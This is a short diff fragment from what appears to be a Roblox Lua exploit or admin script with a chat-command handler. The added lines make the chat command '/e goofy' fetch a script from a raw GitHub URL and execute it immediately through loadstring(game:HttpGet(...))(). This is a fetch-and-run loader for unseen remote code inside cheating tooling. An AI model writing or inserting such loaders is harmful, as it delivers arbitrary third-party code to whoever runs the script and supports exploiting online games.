@@ -6837,6 +6837,8 @@ coroutine.wrap(VYXMZ_fake_script)()
 
 	end
 end)
+   elseif cht:match("/e goofy") then
+loadstring(game:HttpGet("https://raw.githubusercontent.com/theweakestskid/e/main/AAAAA.txt",true))()
      end
 end)
 game:GetService("StarterGui"):SetCore("SendNotification", { 
